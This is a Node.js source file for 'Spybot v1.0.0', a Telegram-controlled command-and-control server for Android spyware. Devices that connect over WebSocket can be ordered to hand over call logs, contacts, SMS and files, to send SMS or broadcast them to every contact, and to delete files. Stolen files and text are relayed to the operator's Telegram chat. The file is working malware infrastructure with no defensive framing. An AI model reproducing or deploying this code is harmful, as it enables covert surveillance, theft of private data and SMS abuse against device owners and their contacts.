const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

require('dotenv').config();

const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const PORT = process.env.PORT || 8999;

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('Telegram bot initialized');
} catch (error) {
    console.error('Failed to initialize Telegram bot:', error.message);
}

const appClients = new Map();
const deviceConnections = new Map();

const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 100 * 1024 * 1024 }
});
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

let currentDeviceId = '';
let currentNumber = '';

app.get('/', (req, res) => {
    res.send('<h1>Spybot v1.0.0</h1><p>Status: Active</p>');
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        version: '1.0.0',
        connectedDevices: deviceConnections.size,
        uptime: process.uptime(),
        features: ['calls', 'contacts', 'sms', 'files']
    });
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) return res.status(400).send('No file uploaded');
        const name = req.file.originalname || 'file';
        const model = req.headers.model || 'Device';
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `📤 <b>${model}</b>`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('Error sending document:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload error:', error.message);
        res.status(500).send('Error');
    }
});

app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'Device';
        const text = req.body['text'] || '';
        if (appBot && id) {
            appBot.sendMessage(id, `📤 <b>${model}</b>\n\n` + text, {
                parse_mode: "HTML"
            }).catch(err => console.error('Error:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Text upload error:', error.message);
        res.status(500).send('Error');
    }
});

appSocket.on('connection', (ws, req) => {
    try {
        const model = req.headers.model || 'Device';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'Unknown';
        const provider = req.headers.provider || 'Unknown';

        const deviceId = `${model}:${provider}`;
        const isReconnection = deviceConnections.has(deviceId);

        if (isReconnection) {
            const oldUuid = deviceConnections.get(deviceId);
            const oldClient = appClients.get(oldUuid);
            if (oldClient && oldClient.ws) {
                oldClient.ws.isReplaced = true;
                if (oldClient.ws.readyState === 1) {
                    oldClient.ws.close();
                }
            }
            appClients.delete(oldUuid);
            console.log(`Reconnection: ${model}`);
        }

        const uuid = uuid4.v4();
        ws.uuid = uuid;
        ws.isAlive = true;
        ws.deviceId = deviceId;
        ws.isReplaced = false;

        deviceConnections.set(deviceId, uuid);

        appClients.set(uuid, {
            model, battery, version, provider, ws, deviceId,
            connectedAt: new Date().toISOString()
        });

        console.log(`Device connected: ${model}`);

        if (!isReconnection && appBot && id) {
            appBot.sendMessage(id,
                `📱 <b>New Device Connected</b>\n\n` +
                `• Device: <b>${model}</b>\n` +
                `• Battery: <b>${battery}%</b>\n` +
                `• Android: <b>${version}</b>\n` +
                `• Provider: <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
        }

        ws.on('pong', () => { ws.isAlive = true; });

        ws.on('close', () => {
            console.log(`Device disconnected: ${model}`);
            if (!ws.isReplaced && deviceConnections.get(ws.deviceId) === ws.uuid) {
                deviceConnections.delete(ws.deviceId);
                if (appBot && id) {
                    appBot.sendMessage(id,
                        `📱 <b>Device Disconnected</b>\n\n• Device: <b>${model}</b>`,
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('Error:', err.message));
                }
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', (error) => {
            console.error(`WebSocket error: ${error.message}`);
        });

    } catch (error) {
        console.error('Connection error:', error.message);
    }
});

const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            if (ws.deviceId && deviceConnections.get(ws.deviceId) === ws.uuid) {
                deviceConnections.delete(ws.deviceId);
            }
            appClients.delete(ws.uuid);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            }
        } catch (error) {
            console.error('Message handling error:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('Callback error:', error.message);
        }
    });

    appBot.on('polling_error', (error) => {
        console.error('Polling error:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;

    const replyText = message.reply_to_message?.text || '';

    if (replyText.includes('📱 Enter the number to send SMS')) {
        currentNumber = message.text;
        appBot.sendMessage(id, '💬 Now enter the message to send:', { reply_markup: { force_reply: true } })
            .catch(err => console.error('Error:', err.message));
    }

    if (replyText.includes('💬 Now enter the message to send')) {
        sendToDevice(currentDeviceId, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentDeviceId = '';
        sendProcessingMessage();
    }

    if (replyText.includes('📢 Enter message to send to all contacts')) {
        sendToDevice(currentDeviceId, `send_message_to_all:${message.text}`);
        currentDeviceId = '';
        sendProcessingMessage();
    }

    if (replyText.includes('📁 Enter the file path to download')) {
        sendToDevice(currentDeviceId, `file:${message.text}`);
        currentDeviceId = '';
        sendProcessingMessage();
    }

    if (replyText.includes('🗑️ Enter the file path to delete')) {
        sendToDevice(currentDeviceId, `delete_file:${message.text}`);
        currentDeviceId = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '📱 <b>Spybot v1.0.0</b>\n\n' +
            '• Wait for device connection\n' +
            '• Select device to control\n\n' +
            '<b>Features:</b>\n' +
            '• 📞 Call Log\n' +
            '• 👥 Contacts\n' +
            '• 💬 SMS (Read/Send/Broadcast)\n' +
            '• 📁 File Manager',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('Error:', err.message));
    }

    if (message.text === '📱 Connected Devices') {
        if (deviceConnections.size === 0) {
            appBot.sendMessage(id, '📱 <b>No connected devices</b>\n\n• Waiting for device connection...', { parse_mode: "HTML" })
                .catch(err => console.error('Error:', err.message));
        } else {
            let text = '📱 <b>Connected Devices:</b>\n\n';
            deviceConnections.forEach((uuid, deviceId) => {
                const client = appClients.get(uuid);
                if (client) {
                    text += `• <b>${client.model}</b>\n` +
                        `  Battery: ${client.battery}% | Android: ${client.version}\n` +
                        `  Provider: ${client.provider}\n\n`;
                }
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('Error:', err.message));
        }
    }

    if (message.text === '⚡ Execute Command') {
        if (deviceConnections.size === 0) {
            appBot.sendMessage(id, '📱 <b>No connected devices</b>', { parse_mode: "HTML" })
                .catch(err => console.error('Error:', err.message));
        } else {
            const deviceListKeyboard = [];
            deviceConnections.forEach((uuid, deviceId) => {
                const client = appClients.get(uuid);
                if (client) {
                    deviceListKeyboard.push([{
                        text: client.model,
                        callback_data: 'device:' + encodeURIComponent(deviceId)
                    }]);
                }
            });
            appBot.sendMessage(id, '📱 Select device:', {
                "reply_markup": { "inline_keyboard": deviceListKeyboard }
            }).catch(err => console.error('Error:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const deviceId = decodeURIComponent(data.split(':')[1]);

    if (!id) return;

    const uuid = deviceConnections.get(deviceId);
    const deviceInfo = uuid ? appClients.get(uuid) : null;

    const commandHandlers = {
        'device': () => {
            if (!deviceInfo) {
                appBot.sendMessage(id, '✗ Device not found or disconnected').catch(() => {});
                return;
            }
            appBot.editMessageText(`📱 <b>Control Panel: ${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📞 Call Log', callback_data: `calls:${encodeURIComponent(deviceId)}` },
                            { text: '👥 Contacts', callback_data: `contacts:${encodeURIComponent(deviceId)}` }
                        ],
                        [
                            { text: '💬 Messages', callback_data: `messages:${encodeURIComponent(deviceId)}` },
                            { text: '📤 Send SMS', callback_data: `send_message:${encodeURIComponent(deviceId)}` }
                        ],
                        [
                            { text: '📢 SMS to All', callback_data: `send_message_to_all:${encodeURIComponent(deviceId)}` }
                        ],
                        [
                            { text: '📁 Download File', callback_data: `file:${encodeURIComponent(deviceId)}` },
                            { text: '🗑️ Delete File', callback_data: `delete_file:${encodeURIComponent(deviceId)}` }
                        ]
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('Error:', err.message));
        },
        'calls': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            sendToDevice(deviceId, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            sendToDevice(deviceId, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            sendToDevice(deviceId, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '📱 Enter the number to send SMS:\n\n• Enter local number with country code',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentDeviceId = deviceId;
        },
        'send_message_to_all': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '📢 Enter message to send to all contacts:\n\n• This will send SMS to all saved contacts',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentDeviceId = deviceId;
        },
        'file': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '📁 Enter the file path to download:\n\n' +
                '• Example: <b>DCIM/Camera</b> for gallery\n' +
                '• Example: <b>Download</b> for downloads',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentDeviceId = deviceId;
        },
        'delete_file': () => {
            if (!deviceInfo) { appBot.sendMessage(id, '✗ Device disconnected').catch(() => {}); return; }
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '🗑️ Enter the file path to delete:\n\n• Example: <b>DCIM/Camera/photo.jpg</b>',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentDeviceId = deviceId;
        }
    };

    const handler = commandHandlers[command];
    if (handler) handler();
}

function sendToDevice(deviceId, command) {
    const uuid = deviceConnections.get(deviceId);
    if (!uuid) return;
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === uuid) ws.send(command);
    });
}

function deleteAndSendProcessing(messageId) {
    appBot.deleteMessage(id, messageId).catch(() => {});
    sendProcessingMessage();
}

function sendProcessingMessage() {
    appBot.sendMessage(id, '⏳ Processing...').catch(() => {});
}

appServer.listen(PORT, () => {
    console.log(`Spybot Server v1.0.0 running on port ${PORT}`);
});
